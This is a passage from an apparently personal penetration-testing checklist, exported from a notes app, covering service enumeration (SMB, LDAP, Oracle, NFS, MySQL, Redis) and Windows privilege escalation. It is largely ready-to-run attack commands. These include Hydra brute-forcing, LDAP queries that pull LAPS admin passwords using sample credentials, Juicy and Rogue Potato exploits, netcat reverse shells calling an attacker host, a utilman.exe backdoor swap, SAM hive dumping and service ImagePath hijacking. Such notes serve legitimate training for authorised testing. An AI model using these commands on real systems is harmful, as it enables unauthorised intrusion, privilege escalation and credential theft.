id="618577f5-a12d-4c6b-ad0c-3cf55b05853a" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">nmap --script smb-vuln* -p445 $IP</span><div class="indented"></div></li></ul><ul id="5fbe27ed-ee70-4c93-ae91-3bffcba9135f" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">SambaCry, EternalBlue</span><div class="indented"><ul id="b17f4a0d-94eb-4ef3-8812-96cb059762f0" class="toggle"><li><details open=""><summary>Nmap Checks</summary><ul id="c60cce54-6c51-4494-a71e-807991990a4c" class="bulleted-list"><li style="list-style-type:disc">SambaCry - <code>nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 $IP</code></li></ul></details></li></ul></div></li></ul><ul id="fc54e0bb-2642-40a2-95e9-168c85527eba" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Get Samba version</span><div class="indented"><ul id="efb42281-48c9-47e0-9cac-86b6a080cf5f" class="toggle"><li><details open=""><summary>Steps</summary><p id="77adc52c-63cd-495b-8c39-da7608ddb9a7" class="">Wireshark and look for Session Setup Andx Responses</p><p id="9be87f05-1771-4701-869a-728e59890ec4" class="">use and change interface <a href="https://github.com/rewardone/OSCPRepo/blob/master/scripts/recon_enum/smbver.sh">https://github.com/rewardone/OSCPRepo/blob/master/scripts/recon_enum/smbver.sh</a></p></details></li></ul></div></li></ul></details></li></ul><ul id="a09170c2-cc71-4a5a-9b01-052bbc34cda4" class="toggle"><li><details open=""><summary>imap - 143</summary><ul id="369a1430-3eed-4ce3-91b3-4b981e59c9e0" class="bulleted-list"><li style="list-style-type:disc">nc -nv $IP 143</li></ul></details></li></ul><ul id="17185d5b-21ff-48cb-bfc4-81fc16bcc685" class="toggle"><li><details open=""><summary>snmp - 161, 162</summary><ul id="7b17fe66-01a6-44a6-bb83-5ef360b3cc1e" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">snmp-check -p &lt;port number&gt; $IP</span><div class="indented"></div></li></ul></details></li></ul><ul id="c9405127-063f-459f-aa6a-9bac92236010" class="toggle"><li><details open=""><summary>ldap - 389, 636</summary><ul id="0b3fab21-4d22-4869-82bf-a102f9b9b6ae" class="toggle"><li><details open=""><summary>ldapsearches</summary><ul id="0fcd10cf-5f41-4451-9080-e896089a5935" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked"><code>ldapsearch -H ldap://$IP -x -s base namingcontexts</code></span><div class="indented"></div></li></ul><ul id="b7228e67-6102-4f0e-bf57-8ec9e0cca11b" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked"><code>ldapsearch -H ldap://$IP -x -b &quot;DC=?,DC=?&quot;</code></span><div class="indented"></div></li></ul><ul id="09d7b644-03a5-4797-bd51-1eb3f643c1dc" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked"><code>ldapsearch -H ldap://$IP -x -b &quot;DC=?,DC=local&quot; &#x27;(objectClass=Person)&#x27;</code></span><div class="indented"></div></li></ul><ul id="ae60dc5e-2067-437e-aa3c-f7cceac6bec8" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked"><code>ldapsearch -H ldap://$IP -x -b &quot;DC=?,DC=?&quot; &#x27;(objectClass=User)&#x27; sAMAccountName | grep sAMAccountName</code></span><div class="indented"></div></li></ul><ul id="112e451a-5aae-4d1d-9935-a999679e087f" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">with credentials </span><div class="indented"><p id="53128dbf-3225-4dc6-bb1e-49cd8a751aca" class=""><code>ldapsearch -x -H ldap://&lt;IP&gt; -D &#x27;&lt;DOMAIN&gt;\&lt;username&gt;&#x27; -w &#x27;&lt;password&gt;&#x27; -b &quot;DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;&quot;</code></p></div></li></ul><ul id="d07fe3d6-9e62-401c-8909-de5e0a0948b0" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">if LAPS is enabled to get admin password <code>ldapsearch -v -x -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b &quot;DC=hutch,DC=offsec&quot; -h 192.168.120.108 &quot;(ms-MCS-AdmPwd=*)&quot; ms-MCS-AdmPwd</code></span><div class="indented"></div></li></ul><ul id="12f686af-f635-80c8-aac0-ccd0b66a146a" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">non disabled users <code>ldapsearch -x -H &#x27;ldap://10.10.10.100&#x27; -D &#x27;SVC_TGS&#x27; -w &#x27;GPPstillStandingStrong2k18&#x27; -b<br/>&quot;dc=active,dc=htb&quot; -s sub &quot;(&amp;(objectCategory=person)(objectClass=user)(!<br/>(useraccountcontrol:1.2.840.113556.1.4.803:=2)))&quot; samaccountname | grep sAMAccountName<br/></code></span><div class="indented"></div></li></ul><ul id="174686af-f635-80c8-aa17-c643f0b6e176" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Get unique ldap results <code>cat tmp | awk &#x27;{print $1}&#x27; | sort | uniq -c | sort -n</code></span><div class="indented"></div></li></ul><ul id="174686af-f635-80b9-9995-d99b8e518485" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked"></span><div class="indented"></div></li></ul><p id="12f686af-f635-80f3-b6df-f9bc4bfaa7d2" class="">
</p></details></li></ul></details></li></ul><ul id="6ae73bc1-8824-4bad-aeff-7ac7fd532ff0" class="toggle"><li><details open=""><summary>Oracle TNS Listener</summary><ul id="3785f0af-e603-49da-afbe-287bd3f0f017" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">nmap --script &quot;oracle-tns-version&quot; -p 1521 -T4 -sV $IP</span><div class="indented"></div></li></ul><ul id="b3d27f6e-d9c9-4192-96ef-8ded51cc99a5" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">use hydra if password protected - <code>hydra -P rockyou.txt -t 32 -s 1521 $IP oracle-listener</code></span><div class="indented"></div></li></ul><ul id="604aed4b-d843-44d2-9f20-4099f5fb1b0f" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">bruteforce SID (database name) - nmap --script +oracle-sid-brute -p 1521 $IP</span><div class="indented"></div></li></ul><ul id="26c4ca5d-add4-41f0-b0b7-9a0831e94a5f" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">use odat to bruteforce credentials for SID</span><div class="indented"></div></li></ul></details></li></ul><ul id="e94dc12d-a3fe-460b-bf40-51784a8ee770" class="toggle"><li><details open=""><summary>NFS - 2049</summary><ul id="376e764b-2cb0-41aa-98e0-45be7c61e8e7" class="toggle"><li><details open=""><summary>Command</summary><ul id="490cfbde-99fa-43e0-8363-fc3cfbc69e03" class="bulleted-list"><li style="list-style-type:disc">list mountable drives - <code>showmount -e $IP</code></li></ul><p id="b67093cc-264b-4d31-8aa8-3a5f2cbceaec" class="">If mountable shares found</p><ol type="1" id="f03b730d-e2bd-4ce1-be02-7b228ce91cf9" class="numbered-list" start="1"><li>make local mount point - <code>sudo mkdir /mnt/loot</code></li></ol><ol type="1" id="ecdd7f0f-1ebf-4b51-bdce-50fc6406bc1e" class="numbered-list" start="2"><li><code>sudo mount $IP:/&lt;name&gt; /mnt/loot</code></li></ol></details></li></ul></details></li></ul><ul id="e065cc2f-7d5b-41fe-9251-7ca952e46d92" class="toggle"><li><details open=""><summary>mysql - 3306</summary><p id="cd8b4793-7f7b-4e53-8d56-72d46ce52e46" class=""><code>mysql -h $IP -u root<br/> mysql -h &lt;Hostname&gt; -u root@localhost<br/></code></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8d639ef4-cce1-4d65-a7f1-85bbe72d6530" class="code"><code class="language-PowerShell">nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 $IP</code></pre></details></li></ul><ul id="5fb8abe4-2d0a-4e09-a1e7-642cccf6051f" class="toggle"><li><details open=""><summary>Redis - 6379</summary><ul id="52708d7e-ffe6-44fc-acab-3cb4e8065fb8" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">connect - <code>nc -nv $IP 6379</code></span><div class="indented"></div></li></ul><ul id="2fc1568d-5c30-4069-b7b3-a46dda7157e3" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">check permissions - INFO</span><div class="indented"></div></li></ul></details></li></ul><ul id="172686af-f635-8071-b2ea-c8add8c86859" class="toggle"><li><details open=""><summary>Exchange</summary><ul id="172686af-f635-80e4-985f-fb75bdbccfcc" class="bulleted-list"><li style="list-style-type:disc">PrivExchange - <a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/">https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/</a></li></ul></details></li></ul></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Privilege Escalation</summary><div class="indented"><ul id="32600181-5c95-44e1-b9eb-d0cb4895c809" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">whoami /all</span><div class="indented"></div></li></ul><ul id="4af72695-d3b6-4c9c-ac8b-221ab3a04bc2" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">look around directories for interesting files or directories</span><div class="indented"></div></li></ul><ul id="32a4f2ed-acef-46ab-8397-a300d6b05d4e" class="toggle"><li><details open=""><summary>Windows</summary><ul id="fc81762a-1a35-402a-8379-cd02368343ec" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">whoami /priv </span><div class="indented"><ul id="89686dfe-9784-47b0-934c-eb4371c00a1d" class="toggle"><li><details open=""><summary>Interesting Permissions</summary><ul id="14e0e878-d876-4ec7-9a88-ab933ab7310f" class="toggle"><li><details open=""><summary><em><strong>SeImpersonatePrivilege</strong></em> or <em><strong>SeAssignPrimaryTokenPrivilege</strong></em></summary><ul id="77e6231c-2dc4-4f55-b801-b994a6e21196" class="toggle"><li><details open=""><summary>Print Spoofer</summary><ul id="9359678f-69c6-434e-9e29-38bceda934b0" class="bulleted-list"><li style="list-style-type:disc">Windows 10 and Server 2016/2019</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9cca73aa-d675-4f20-bf69-e00f60eba3d9" class="code"><code class="language-PowerShell">PrintSpoofer.exe -i -c cmd</code></pre></details></li></ul><ul id="30d4fce9-edb7-4a27-ad85-d94368498b18" class="toggle"><li><details open=""><summary>Juicy Potato</summary><ul id="01f5a82b-2754-4434-8fce-b236e203332f" class="toggle"><li><details open=""><summary>Vulnerable OS</summary><ul id="10fad18e-2395-47cd-a43e-9cd1b5f4455d" class="bulleted-list"><li style="list-style-type:disc">Windows 10 Enterprise</li></ul><ul id="3679f260-2d06-4049-8ba5-c2298ac64df8" class="bulleted-list"><li style="list-style-type:disc">Windows 10 Pro (if ≥ 1809 try PrintSpoofer) </li></ul><ul id="c3235a2c-f4c0-4a9f-9154-45630474a4cc" class="bulleted-list"><li style="list-style-type:disc">Windows 7 Enterprise</li></ul><ul id="1a8056db-0540-42a0-bbb9-1c1ff01d3fb5" class="bulleted-list"><li style="list-style-type:disc">Windows 8.1 Enterprise</li></ul><ul id="d6d8fa66-7024-4aa1-a6c4-2789977a541d" class="bulleted-list"><li style="list-style-type:disc">Windows Server_2008 R2 Enterprise</li></ul><ul id="c0dc61a9-2e7c-4171-a2af-8fc7ee95b73d" class="bulleted-list"><li style="list-style-type:disc">Windows Server 2012 Datacenter</li></ul><ul id="548d7ad0-2513-4b13-b427-a40a1035fcbb" class="bulleted-list"><li style="list-style-type:disc">Windows Server 2012 R2</li></ul><ul id="488bad55-de86-426a-a39a-bc29860b75ac" class="bulleted-list"><li style="list-style-type:disc">Windows Server 2016</li></ul></details></li></ul><ul id="104eac66-e140-45bf-ab7e-e84dee01388c" class="bulleted-list"><li style="list-style-type:disc">download binary for OS (x64, x86, etc.)</li></ul><ul id="8e2672de-a6d1-4517-9ef7-6c544c996ad7" class="toggle"><li><details open=""><summary>get CLSID</summary><ul id="09f6589e-aa77-4335-9aaf-af30d600a1cf" class="bulleted-list"><li style="list-style-type:disc"> <a href="http://ohpe.it/juicy-potato/CLSID/">http://ohpe.it/juicy-potato/CLSID/</a></li></ul><ul id="5fbc78d6-5fef-4a8c-88dd-4b228ef3b9c3" class="bulleted-list"><li style="list-style-type:disc">or run script GetCLSID.ps1</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="aa794996-a8ac-4ed4-9808-8b2e7b6cd2c1" class="code"><code class="language-PowerShell">powershell -executionpolicy bypass -file GetCLSID.ps1 &gt; clsid.txt</code></pre></details></li></ul><ul id="bd0c6943-0245-433a-81cb-e8305b0c2d83" class="toggle"><li><details open=""><summary>Commands</summary><p id="90dc6017-6b83-47ac-a1cc-9342682606a1" class="">*MAKE SURE TO USE FULL PATH TO NCAT AND .BAT</p><p id="4c64e7c9-07c1-4c01-9cb5-ecf655af0cc1" class="">create .bat file that creates reverse shell</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6796e6a6-f17a-45d8-9f81-5f28a25224f1" class="code"><code class="language-PowerShell">Juicy.Potato.exe -t * -p &lt;full path to .bat&gt; -l 6969 -c &lt;code&gt;</code></pre><p id="b7a94478-7057-456e-982c-f5d6426b14a6" class="">Juicy Potato line</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7c760b97-8fed-4d4e-859c-108ea4d7655e" class="code"><code class="language-PowerShell">&lt;full path to nc&gt; -e cmd.exe &lt;lhost&gt; &lt;lport&gt;</code></pre></details></li></ul></details></li></ul><ul id="31163014-4665-43ae-a46a-ea1605a7e227" class="toggle"><li><details open=""><summary>Rogue Potato</summary><p id="efa82bf5-5f54-4e99-9891-a3ea492a1415" class="">&gt;= Windows 10 1809 &amp; Windows Server 2019</p><p id="35747139-dcf5-41e8-a7dc-f6a4f8e08f71" class=""><code>socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999</code></p><p id="2117fbb2-78e4-4c83-845f-db8ac5ada0cf" class="">Generic <code>.\RoguePotato.exe -r YOUR_IP -e &quot;command&quot; -l 9999</code></p><p id="53adda7e-f8f1-401f-ac53-4cb1ee196abc" class="">Netcat reverse shell <code>.\RoguePotato.exe -r 172.16.1.30 -e &quot;C:\temp\nc.exe 172.16.1.30 443 -e cmd.exe&quot; -l 9999</code></p><p id="ed68ad0b-a8bd-4aa4-9853-c5ec85cf3bda" class="">changing admin password</p><p id="55dfa361-2891-42bd-a830-dcd574cda6f0" class=""><code>.\RoguePotato.exe -r 192.168.45.5 -e &quot;net user Administrator password&quot; -l 9999</code></p></details></li></ul></details></li></ul><ul id="2b502fab-25e1-4e13-af42-5e1751cfe8fb" class="toggle"><li><details open=""><summary><em><strong>SeRestorePrivilege</strong></em></summary><p id="6a3e3ad6-d221-40a7-8d14-44daa2d3f288" class="">lets you modify binaries and registry settings</p><ul id="bab8decf-42a0-49d7-bd87-38a56c8f9d6b" class="toggle"><li><details open=""><summary>With RDP</summary><p id="66f8d48f-57f4-4fc3-8a17-9e247ce8729e" class=""><code>wget https://raw.githubusercontent.com/gtworek/PSBits/master/Misc/EnableSeRestorePrivilege.ps1</code></p><p id="f209480b-ea3c-497a-bdc8-1c58294c6d17" class=""><code>move C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old</code></p><p id="730fee8e-86ed-430c-9351-d34c12082db0" class=""><code>move C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe</code></p><p id="1932019a-4052-455f-9156-3c6acac0c474" class=""><code>rdesktop $IP</code></p><p id="4232f394-d953-43c2-b62d-6d051cf49d23" class="">Win + U will launch system shell</p></details></li></ul><ul id="7758c07b-c8f3-4826-b76b-9dfb67b0074e" class="toggle"><li><details open=""><summary>Without</summary><p id="141b798b-c912-418e-9608-ba629c1456c0" class=""><a href="https://github.com/xct/SeRestoreAbuse">https://github.com/xct/SeRestoreAbuse</a></p><p id="baee0932-f4fa-432a-a619-4a4dd8fa0a2a" class=""><code>SeRestoreAbuse.exe &quot;cmd /c net localgroup administrators USER&quot;</code></p></details></li></ul></details></li></ul><ul id="afa582c4-1b1d-4a0d-8f4c-1a568a89791e" class="toggle"><li><details open=""><summary><em><strong>SeBackUpPrivilege</strong></em></summary><p id="19cb19f4-c1a0-4081-bd0a-4565d1f13579" class=""> lets you read files and extract passwords or hashes</p><ul id="15c2b514-507e-4d40-b8a0-1259925f4f0b" class="toggle"><li><details open=""><summary>Get SAM</summary><p id="5c5489ca-77b4-4f33-a4a0-8f6057d2b6a6" class="">cd c:\</p><p id="4270f1d7-1c6b-4969-9a45-32db49691c8a" class="">mkdir Temp</p><p id="5f3e3b9a-f0ae-42c5-8c60-b4942c540a6a" class="">reg save hklm\sam c:\Temp\sam</p><p id="f4d9604c-482f-4e74-a10c-4189a7529666" class="">reg save hklm\system c:\Temp\system</p><p id="310c9a59-f1a7-41d7-b38f-e13f694fdd86" class="">cd Temp<br/>download sam<br/>download system<br/></p><p id="c807850c-34a8-41ef-989a-4f5573579a71" class="">pypykatz registry --sam sam system</p></details></li></ul><ul id="632e2a90-e3c5-4dd4-9c1c-c4941d6ad55b" class="toggle"><li><details open=""><summary>Modify ACL</summary><figure id="29e62fd2-63b9-461d-8b93-e2bc6fc8ec75"><a href="https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">PsCabesha-tools/Acl-FullControl.ps1 at master · Hackplayers/PsCabesha-tools</div><div class="bookmark-description">Powershell crazy and sometimes diabolic scripts. Contribute to Hackplayers/PsCabesha-tools development by creating an account on GitHub.</div></div><div class="bookmark-href"><img src="https://github.com/fluidicon.png" class="icon bookmark-icon"/>https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1</div></div><img src="https://opengraph.githubassets.com/c39c370d08d56db0df285e10a800a3cdbaa73ffb7791d99257a6a45da02eac01/Hackplayers/PsCabesha-tools" class="bookmark-image"/></a></figure><p id="090c3d10-7f37-46de-887b-d93b85d6cc98" class=""><code>Import-Module .\Acl-FullControl.ps1</code></p><p id="823ce5c6-b723-404e-bfc9-f67190f7ce26" class=""><code>Acl-FullControl -user DOMAIN\USER -path C:\users\administrator</code></p></details></li></ul></details></li></ul><ul id="2bfcf454-dc88-4b9b-a231-647a95be7ba8" class="bulleted-list"><li style="list-style-type:disc">SeCreateTokenPrivilege, </li></ul><ul id="0d808bea-3ee6-42be-9fa5-0ec984fde857" class="bulleted-list"><li style="list-style-type:disc">SeLoadDriverPrivilege</li></ul><ul id="b2fcdbff-cf0a-49eb-8495-6dfb8697b279" class="bulleted-list"><li style="list-style-type:disc">SeDebugPrivilege</li></ul></details></li></ul></div></li></ul><ul id="af3fadc4-8b0b-456e-8530-2033210b0d9f" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">net user &lt;username&gt;</span><div class="indented"></div></li></ul><ul id="828b5f06-1378-4c13-9fe3-c89845685349" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Systeminfo</span><div class="indented"><ul id="f1895a85-b9ec-41e0-986f-a35e7959670b" class="toggle"><li><details open=""><summary>Command</summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0ad3a182-92aa-47bb-9687-b17980eab143" class="code"><code class="language-PowerShell">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; /C:&quot;System Type&quot;</code></pre></details></li></ul></div></li></ul><ul id="2ca40dec-b881-4b3c-86d2-eb1b35bbf691" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Look for interesting programs</span><div class="indented"><ul id="d0f0309b-8544-4337-9b1f-95054e822580" class="toggle"><li><details open=""><summary>List</summary><ul id="eb367f0f-c495-4079-bde4-42dcfcebeac3" class="bulleted-list"><li style="list-style-type:disc">Paperstream IP</li></ul></details></li></ul></div></li></ul><ul id="c1f56fa8-6bb8-4c22-84ab-29c841be0efb" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Processes and services</span><div class="indented"><ul id="2bd849b9-692e-4c3f-9d7f-d54f11138407" class="toggle"><li><details open=""><summary>Types</summary><ul id="97172fd9-5106-43b7-890f-7b197c831a44" class="bulleted-list"><li style="list-style-type:disc">Modifiable Configuration (change config perms)</li></ul><ul id="dbe35934-a606-4763-bd48-eeb0a449e935" class="bulleted-list"><li style="list-style-type:disc">Unquoted Path</li></ul><ul id="31c80e34-c4ba-48fb-b045-65983b0eea91" class="bulleted-list"><li style="list-style-type:disc">Weak Service registry allowing config changes</li></ul><ul id="941de42c-83a5-4518-a9bc-f01ab4b3c67f" class="bulleted-list"><li style="list-style-type:disc">Insecure Service Executable</li></ul></details></li></ul><ul id="4e4b09e3-e559-475e-9b23-9566dc1cc9ee" class="toggle"><li><details open=""><summary>Enumeration</summary><ul id="bdfab4a1-49c7-4378-bb0f-f2621e4772e4" class="bulleted-list"><li style="list-style-type:disc">list all - <code><strong>tasklist /SVC</strong></code></li></ul><ul id="b89e739e-af09-4f23-b37f-b0494811bda5" class="bulleted-list"><li style="list-style-type:disc">system processes - <code>tasklist /v /fi &quot;username eq system&quot;</code></li></ul><ul id="e05a2335-2111-4306-8204-22783c7be639" class="bulleted-list"><li style="list-style-type:disc">Get path, privileges, and start type - <code>sc qc &lt;name&gt;</code></li></ul><ul id="3810b99e-5509-43c9-965f-3932e7e21168" class="bulleted-list"><li style="list-style-type:disc">get current status - <code>sc query &lt;name&gt;</code></li></ul><ul id="bba81a7b-165a-4c45-b46f-9adaac70950f" class="bulleted-list"><li style="list-style-type:disc">check service perms - <code>accesschk /accepteula -ucqv user &lt;name&gt;</code></li></ul><ul id="430f2592-9f10-47b2-b7d9-55decde70b1f" class="bulleted-list"><li style="list-style-type:disc">check path write perms - <code>accesschk /accepteula -uwdq &quot;path&quot;</code></li></ul><ul id="fb148d5d-00f8-4b8c-bd95-60bfee5b5c5c" class="bulleted-list"><li style="list-style-type:disc">check registry perms - <code>accesschk /accepteula -uvwqk &lt;path&gt;</code></li></ul><ul id="bf70fcc1-dddb-4838-911a-62e8d3a7f8c7" class="bulleted-list"><li style="list-style-type:disc">get Image Path for reg - <code>reg query &lt;path&gt;</code></li></ul><ul id="af9d314a-a394-40ea-b565-f8b9f00f9b99" class="bulleted-list"><li style="list-style-type:disc">change image path - <code>reg add &lt;path&gt; /v ImagePath /t REG_EXPAND_SZ /d &lt;reverse.exe path&gt; /f </code></li></ul></details></li></ul></div></li></ul><ul id="6a2a44ab-9f85-4f1c-949c-a794f654baa5" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Listening ports - <code><strong>netstat -ano</strong></code></span><div class="indented"></div></li></ul><ul id="2a43b5f6-ccbe-4543-a3cf-8c8245519c73" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Scheduled tasks </span><div class="indented"><ul id="d1bb91f7-f571-46de-b2b7-25d68b9945cf" class="toggle"><li><details open=""><summary>Command</summary><p id="1d14a84f-4c27-4779-b30e-7713b19f4264" class="">List non-windows scheduled tasks</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="fca6b31e-06f4-4270-b60c-d5edce4872a6" class="code"><code class="language-PowerShell">powershell -c &quot;Get-ScheduledTask | where {$_.TaskPath -notlike &#x27;\Microsoft*&#x27;} | ft TaskName,TaskPath,State&quot;</code></pre><p id="4988b161-a18b-4d18-abb4-bceac072420f" class="">Get more info about task</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="33bd92a8-fcf8-4f26-a501-e04016f28bb9" class="code"><code class="language-PowerShell">powershell -c &quot;Get-ScheduledTaskInfo -TaskName &#x27;name&#x27;&quot;</code></pre></details></li></ul></div></li></ul><ul id="b93de408-27fa-48c8-92f9-233123d141c3" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">AutoElevate for malicious MSI files</span><div class="indented"><ul id="aa31ae0f-04a1-45bc-b29c-cb966a9fb14a" class="toggle"><li><details open=""><summary>Commands</summary><p id="621d43db-2059-416b-aa15-5c1994f6438f" class="">If either 1, then possible</p><p 